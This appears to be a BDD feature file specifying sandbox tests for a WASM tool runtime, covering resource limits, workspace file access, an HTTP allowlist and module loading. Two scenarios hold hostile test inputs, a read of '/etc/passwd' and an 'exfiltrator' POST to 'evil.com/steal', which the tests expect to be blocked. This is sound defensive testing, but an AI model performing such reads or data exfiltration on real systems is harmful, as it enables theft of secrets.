@pending
Feature: WASM Tool Runtime
  As a system administrator
  I want tools to run in isolated WASM containers
  So that tool code cannot access host resources beyond declared capabilities

  # --- Engine and module lifecycle ---

  @pending
  Scenario: WASM runtime initializes with fuel metering and epoch interruption
    Given a WASM tool runtime with default configuration
    Then the runtime engine should have fuel metering enabled
    And the runtime engine should have epoch interruption enabled
    And the runtime engine should have WASM threads disabled

  @pending
  Scenario: WASM module is compiled and cached on first registration
    Given a WASM tool runtime with default configuration
    And a valid WASM tool module "read_file"
    When the module is registered with the runtime
    Then the module cache should contain "read_file"
    And registering the same module again should return the cached version

  @pending
  Scenario: WASM module cache supports removal
    Given a WASM tool runtime with default configuration
    And a registered WASM tool module "read_file"
    When the module "read_file" is removed from the cache
    Then the module cache should not contain "read_file"

  # --- Fresh instance per execution ---

  @pending
  Scenario: Each tool execution gets a fresh WASM store
    Given a WASM tool runtime with default configuration
    And a WASM tool "stateful_test" that writes to a global variable
    When the tool is executed twice with different inputs
    Then each execution should start with a clean state
    And no state should leak between invocations

  # --- Resource limits ---

  @pending
  Scenario: WASM tool execution respects fuel limit
    Given a WASM tool runtime with fuel limit 1000
    And a WASM tool "busy_loop" that consumes excessive fuel
    When the tool is executed
    Then the execution should fail with a fuel exhaustion error

  @pending
  Scenario: WASM tool execution respects memory limit
    Given a WASM tool runtime with memory limit 1 MB
    And a WASM tool "memory_hog" that allocates excessive memory
    When the tool is executed
    Then the execution should fail with a memory limit error

  @pending
  Scenario: WASM tool execution respects epoch-based timeout
    Given a WASM tool runtime with epoch timeout 1 second
    And a WASM tool "infinite_loop" that never returns
    When the tool is executed
    Then the execution should fail with a timeout error
    And the execution should complete within 2 seconds

  # --- WIT host interface ---

  @pending
  Scenario: WASM tool can read a workspace file through host import
    Given a WASM tool runtime with a workspace containing "notes.txt" with content "hello"
    And a WASM tool "reader" that calls workspace-read("notes.txt")
    When the tool is executed
    Then the tool result should contain "hello"
    And the tool result should not be an error

  @pending
  Scenario: WASM tool cannot read files outside workspace
    Given a WASM tool runtime with a workspace at a temporary directory
    And a WASM tool "reader" that calls workspace-read("/etc/passwd")
    When the tool is executed
    Then the tool result should be an error
    And the error should mention "outside" or "denied"

  @pending
  Scenario: WASM tool can write a workspace file through host import
    Given a WASM tool runtime with an empty workspace
    And a WASM tool "writer" that calls workspace-write("output.txt", "data")
    When the tool is executed
    Then the file "output.txt" should exist in the workspace
    And the file "output.txt" should contain "data"

  @pending
  Scenario: WASM tool can list a workspace directory through host import
    Given a WASM tool runtime with a workspace containing files "a.txt" and "b.txt"
    And a WASM tool "lister" that calls workspace-list-dir(".")
    When the tool is executed
    Then the tool result should contain "a.txt"
    And the tool result should contain "b.txt"

  @pending
  Scenario: WASM tool can make HTTP requests through host import
    Given a WASM tool runtime with HTTP allowlist "api.example.com"
    And a mock HTTP server at "api.example.com" returning "search results"
    And a WASM tool "searcher" that calls http-request("GET", "https://api.example.com/search?q=test")
    When the tool is executed
    Then the tool result should contain "search results"

  @pending
  Scenario: WASM tool HTTP request to non-allowlisted host is blocked
    Given a WASM tool runtime with HTTP allowlist "api.example.com"
    And a WASM tool "exfiltrator" that calls http-request("POST", "https://evil.com/steal")
    When the tool is executed
    Then the tool result should be an error
    And the error should mention "not allowed" or "denied"

  @pending
  Scenario: WASM tool can send messages through host import
    Given a WASM tool runtime with a message channel
    And a WASM tool "notifier" that calls send-message("telegram:123", "hello user")
    When the tool is executed
    Then the message channel should have received "hello user" for target "telegram:123"

  @pending
  Scenario: WASM tool can perform cron store operations through host import
    Given a WASM tool runtime with a cron store
    And a WASM tool "scheduler" that calls cron-store-op("add", '{"name":"test","message":"do thing","interval_seconds":3600}')
    When the tool is executed
    Then the cron store should contain a job named "test"

  @pending
  Scenario: WASM tool can perform spill store operations through host import
    Given a WASM tool runtime with a spill store containing entry "spill-001"
    And a WASM tool "recaller" that calls spill-store-op("recall", '{"id":"spill-001"}')
    When the tool is executed
    Then the tool result should contain the spilled content for "spill-001"

  @pending
  Scenario: WASM tool log calls are rate-limited
    Given a WASM tool runtime with log rate limit 100
    And a WASM tool "spammer" that calls log() 200 times
    When the tool is executed
    Then only 100 log entries should be recorded

  # --- WasmToolWrapper integration with Tool trait ---

  @pending
  Scenario: WasmToolWrapper implements the Tool trait
    Given a compiled WASM tool module "read_file"
    When it is wrapped in a WasmToolWrapper
    Then calling definition() should return a valid ToolDefinition
    And calling execute() with valid JSON should return a ToolResult

  @pending
  Scenario: WasmToolWrapper is registered in ToolRegistryImpl
    Given a WASM tool runtime with default configuration
    And a WasmToolWrapper for "read_file"
    When it is registered in the ToolRegistryImpl
    Then the registry definitions should include "read_file"
    And executing "read_file" through the registry should delegate to the WASM module

  # --- Module loading ---

  @pending
  Scenario: WASM tools are loaded from a tools directory
    Given a tools directory containing "read_file.wasm" and "read_file.capabilities.json"
    When the WASM tool loader scans the directory
    Then the tool "read_file" should be registered in the runtime
    And its capabilities should match the JSON sidecar

  @pending
  Scenario: Invalid WASM module is rejected at load time
    Given a tools directory containing "bad_tool.wasm" with invalid WASM bytes
    When the WASM tool loader scans the directory
    Then "bad_tool" should not be registered
    And a warning should be logged

  @pending
  Scenario: WASM module missing required exports is rejected
    Given a WASM module that does not export the tool interface
    When it is registered with the runtime
    Then registration should fail with an error mentioning missing exports
